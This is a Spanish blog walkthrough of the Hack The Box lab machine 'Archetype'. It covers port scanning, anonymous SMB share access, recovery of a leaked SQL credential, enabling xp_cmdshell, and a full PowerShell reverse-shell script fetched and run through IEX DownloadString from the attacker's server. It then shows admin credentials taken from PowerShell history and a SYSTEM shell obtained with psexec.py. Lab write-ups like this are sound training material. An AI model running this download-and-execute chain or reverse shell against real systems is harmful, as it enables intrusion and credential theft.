---
layout: post
title:  "Maquinas para empezar en HTB"
description: En esta ocasion empezaremos con el Writeup de la maquina de StartingPoint de HackTheBox llamada ARCHETYPE
tags: HTB, Empezando, Hacking, Starting
---

# Archetype ~ Hack The Box

Comprobamos que la maquina este activa con una traza ICMP, usamos la herramienta PING.
```bash
 "# ping -c 10 10.10.10.27    "                                       
PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=39.4 ms
64 bytes from 10.10.10.27: icmp_seq=2 ttl=127 time=39.5 ms
^C
--- 10.10.10.27 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 39.430/39.449/39.469/0.019 ms
```
La maquina esta activa y por el ttl identificamos que puede es WINDOWS

# Enumeracion con Nmap 

Procedemos a enumerar todos los puertos abiertos en un escaneo usando los siguiente parametros:

```bash
 "nmap -p- --open -T5 -v -n -Pn 10.10.10.27   " 
```  
 Si en la maquina victima el escaneo con Nmap va lento..
 Usamos el siguiente escaneo:
 
```bash
 "nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn 10.10.10.27 -oG allports    "
```
Con la funcion de extractPorts: filtramos por los puertos abiertos pasandole el archivo de salida del primer escaneo con Nmap

```bash
"# extractPorts allports   "

[*] Extracting information .......

        [*]IP ADDRESS: 10.10.10.27
        [*]OPEN PORTS: 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669

```
 2.- Siguiente Escaneo con Nmap
 
Procedemos a escanear la version y servicios de los puerto encontrados como abiertos:

```bash
"nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN Target 10.10.10.27"
```
Output:

```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-03-16T16:48:45
|_Not valid after:  2051-03-16T16:48:45
|_ssl-date: 2021-03-16T17:55:06+00:00; +17m25s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h41m26s, deviation: 3h07m50s, median: 17m25s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-16T10:54:52-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-16T17:54:54
|_  start_date: N/A
```
Encontramos iformacion util para proseguir con las siguiente herramienta

Utilizamos la siguiente herramienta para ver si tenemos acceso al servicio samba sin proporcionar contraseña (-N) y ver si hay algun recurso disponible, descargarlo, subir algun archivo etc.
 [ smbclient ]
```bash
"smbclient -N -L //10.10.10.27/    "
   
   Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```
Idientificamos un directorio llamado BACKUPS al que podemos acceder sin contraseña:

```bash
"smbclient -N  //10.10.10.27/backups    "
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                10328063 blocks of size 4096. 8255932 blocks available
smb: \> 
```
Listamos si hay algun archivo disponible dentro de "Backups". 
Probamos a descargar el archivo encontrado. 
Lo conseguimos descargar correctamente.

```bash
"smb: \> get prod.dtsConfig    "
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0,7 KiloBytes/sec) (average 0,7 KiloBytes/sec)
```
Le cambiamos de nombre al archivo descargado:
```bash
"mv prod.dtsConfig datos    " 
```
Leemos el archivo encontrado
```bash
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;"Password=M3g4c0rp123";User ID="ARCHETYPE\sql_svc";Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>   
```

# Explotacion del fichero XP_CMDSHELL dentro de Mysql configurandolo para conseguir un RCE (Remote Code Execution)

Usando la herramienta de IMPACKET: [ mssqlclient.py ] 
```bash
"─$ /usr/bin/python3 /opt/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth"                                                          2 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```
Conseguimos acceso desde una nueva terminal con el uso de la herramienta mssqlclient.py de IMPACKETS, y proporcionando la Contraseña encontrada anteriormente en el archivo descargado y el usuario encontrado.

Usamos el siguiente comando para saber si tenemos los privilegios como administrador de la base de datos, y vemos que asi es.
```bash
"SQL> SELECT IS_SRVROLEMEMBER('sysadmin')    "
             
----------   
          1   
```
Uso de XP_CMDSHELL para ejecutar comandos, pero primero hay que configurarlo para poder usarlo.
```bash
"SQL> EXEC sp_configure 'Show Advanced Options', 1;  "
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

"SQL> reconfigure;  "

"SQL> sp_configure;  "
name                                      minimum       maximum  "config_value"    run_value   
-----------------------------------   -----------   -----------   ------------   -----------   
"xp_cmdshell"                                  0             1             "1"            1 

SQL> EXEC sp_configure 'xp_cmdshell', 1 reconfigure;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```
Ejecutando Comandos desde el servicio de MYSQL con la opcion XP_CMDSHELL, habiendola configurado previamente.
```bash
"SQL> xp_cmdshell "whoami"  "
output                                                                             
--------------------------------------------------------------------------------   
archetype\sql_svc                                                                  
NULL                                                                               
SQL> 
```
Ahora que sabemos que podemos ejecutar comandos vamos a postear un servidor que aloje un archivito que nos descargamos para apuntar a el desde la maquina victima y que cuando se ejecute, nos lance una reverse_shell a nuestro equipo en el cual estaremos escuchando con netcat para recibir la conexion entrante.

Empezamos creando el archivo malicioso: "Al que llamaremos shell.ps1"
```bash
$client = New-Object System.Net.Sockets.TCPClient("CAMBIAR POR NUESTRA IP ATACANTE",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt e.Length);$stream.Flush()};$client.Close()
```
una vez ya esta creado, montamos un servidor en python3 para postearlo:
```bash
"python3 -m http.server 80   "
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Abrimos otra terminal y nos ponemos a la escucha en el puerto 443 Indicado en el archivo malicioso
```bash
"nc -lvnp 443  "
listening on [any] 443 ...
```
Ejecutamos un comando a nivel de systema desde MYSQL con la opcion ya configurada XP_CMDSHELL
```bash
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.54/shell.ps1\");"
``` 
Recibimos la conexion en nuestro server:
```bash
"python3 -m http.server 80   "
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.27 - - [11/May/2021 16:47:12] "GET /shell.ps1 HTTP/1.1" 200 -
```
```bash
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.27] 49688
"whoami "
sql_svc
```
Obtencion de la flag USER.TXT
```bash
Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  33,822,490,624 bytes free
```
Hasta aqui seria el Acceso Inicial.
Ahora a Escalar Privilegios hasta el usuario administrador.

# Escalada de Privilegios

Encontramos en esta ruta las siguientes credenciales
```bash
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Console Host_history.txt

"USER: administrator   "
"PASS: MEGACORP_4dm1n!!  "
```
Con la herramienta PSEXEC.PY:
```bash
┌──(pro㉿pro)-[/opt]
└─$" /usr/bin/python3 /opt/impacket/examples/psexec.py administrator@10.10.10.27    "                                                                             1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:  MEGACORP_4dm1n!!
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file ppQcueTy.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service EPRJ on 10.10.10.27.....
[*] Starting service EPRJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

"C:\Users\sql_svc\Desktop>whoami
nt authority\system "
```
Obtendriamos una shell como administrador en la maquina victima.
Procedemos a sacar la flag del administrador o root.txt

```bash
"C:\Users\Administrator\Desktop>type root*    
b91ccec3305e98240082d4474b------    "
```
APRENDIDO:
```bash
 Uso de las herramientas:
 "smbclient    "
 "mssqlclient.py   "
 "psexec.py   "
 "Forma de injeccion de comandos despues de setear la configuracion de la opcion xp_cmdshell en Mysql     "
  xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/shell.ps1\");"   
```
